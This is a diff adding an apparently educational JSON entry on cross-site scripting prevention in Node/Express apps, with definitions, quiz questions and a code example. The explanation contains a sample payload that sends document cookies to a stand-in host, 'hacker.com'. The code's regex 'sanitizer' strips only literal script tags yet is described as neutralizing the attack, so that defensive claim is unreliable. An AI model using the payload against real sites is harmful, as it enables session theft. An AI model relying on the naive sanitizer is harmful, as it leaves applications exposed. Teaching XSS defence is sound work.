@@ -1,0 +1,31 @@
+{
+  "id": "xss",
+  "title": "XSS Prevention",
+  "difficulty": "Intermediate",
+  "definition": "Cross-Site Scripting. A vulnerability where an attacker injects malicious executable scripts into the code of a trusted application or website.",
+  "simpleExplanation": "Imagine a forum where users can post comments. A hacker writes a comment containing `<script>fetch('hacker.com?cookie=' + document.cookie)</script>`. If the Node.js server saves that comment blindly to the database, and then sends it to other users to view, the script will execute in THEIR browsers, stealing all their login cookies.",
+  "realWorldExample": "Stealing session tokens, redirecting users to phishing sites, or forcing the user's browser to perform actions on their behalf.",
+  "useCases": [
+    "Sanitizing user input",
+    "Securing Express APIs"
+  ],
+  "questions": {
+    "basic": [
+      "Does XSS attack the Server or the Client (Browser)?"
+    ],
+    "intermediate": [
+      "How do you prevent XSS attacks in a Node/Express app?"
+    ]
+  },
+  "answers": [
+    {
+      "question": "Who does it attack?",
+      "answer": "It attacks the Client (the victim's web browser). The server is simply used as the delivery mechanism to store and distribute the malicious script."
+    },
+    {
+      "question": "How do you prevent it?",
+      "answer": "Sanitization and Validation. NEVER trust user input. Use libraries like `DOMPurify` or `xss-clean` to strip `<script>` tags from incoming POST bodies before saving them to the database."
+    }
+  ],
+  "codeExample": "// HOW AN XSS ATTACK WORKS\n\nconst maliciousComment = \"Great post! <script>alert('Your cookies are stolen!');</script>\";\n\n// BAD BACKEND:\n// db.comments.save({ text: maliciousComment });\n// When React renders this (if using dangerouslySetInnerHTML), the script executes.\n\n// GOOD BACKEND (Sanitization):\n// npm install xss\n// const xss = require('xss');\n\nconst fakeXssLibrary = (input) => input.replace(/<script>/g, \"\").replace(/<\\/script>/g, \"\");\n\nconst safeComment = fakeXssLibrary(maliciousComment);\nconsole.log(\"Sanitized Data Saved to DB:\");\nconsole.log(safeComment); \n// Output: Great post! alert('Your cookies are stolen!');\n// The code is neutralized and rendered as harmless text."
+}
